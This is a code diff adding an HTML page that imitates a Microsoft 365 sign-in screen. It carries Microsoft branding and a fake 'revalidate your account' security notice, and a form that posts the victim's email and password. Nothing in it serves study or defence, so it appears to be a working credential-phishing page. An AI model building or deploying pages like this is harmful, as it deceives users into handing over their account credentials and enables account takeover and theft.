@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft 365 Login</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.login-container {
+    background-color: white;
+    padding: 20px;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+    width: 100%;
+    max-width: 360px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+}
+
+.logo {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.logo img {
+    height: 36px;
+    margin-right: 10px;
+}
+
+.logo span {
+    font-size: 24px;
+    font-weight: bold;
+    color: #666;
+}
+
+.security-notice {
+    background-color: #fff5cc;
+    padding: 10px;
+    border-left: 4px solid #ffc107;
+    margin: 20px 0;
+    font-size: 14px;
+    color: #555;
+}
+
+form {
+    display: flex;
+    flex-direction: column;
+}
+
+label {
+    font-size: 18px;
+    margin-bottom: 10px;
+}
+
+input {
+    padding: 10px;
+    margin: 5px 0;
+    border: 1px solid #ccc;
+    border-radius: 3px;
+    font-size: 16px;
+}
+
+button {
+    background-color: #0078d4;
+    color: white;
+    padding: 10px;
+    margin-top: 10px;
+    border: none;
+    border-radius: 3px;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #005ea6;
+}
+
+.forgot-link {
+    text-align: right;
+    margin-top: 5px;
+}
+
+.forgot-link a {
+    font-size: 14px;
+    color: #0078d4;
+    text-decoration: none;
+}
+
+footer {
+    text-align: center;
+    font-size: 12px;
+    color: #666;
+    margin-top: 20px;
+}
+
+footer a {
+    color: #0078d4;
+    text-decoration: none;
+}
+
+.info-icon {
+    font-style: normal;
+    font-size: 16px;
+    color: #ffc107;
+    margin-right: 5px;
+}
+
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft 365 Logo">
+            <span>Microsoft 365</span>
+        </div>
+        <div class="security-notice">
+            <i class="info-icon">ℹ️</i> 
+            To keep your account secure, we need to revalidate your account.
+        </div>
+        <form method="post">
+            <label for="email">Sign in</label>
+            <input type="email" id="email" placeholder="Email" name="email" required>
+            <input type="password" id="password" placeholder="Password" name="password" required>
+           
+            <button type="submit">Sign In</button>
+        </form>
+        <footer>
+            <p>Copyright © 1999 – 2018 GoDaddy Operating Company, LLC. All Rights Reserved.</p>
+            <a href="#">Privacy Policy</a>
+        </footer>
+    </div>
+</body>
+</html>
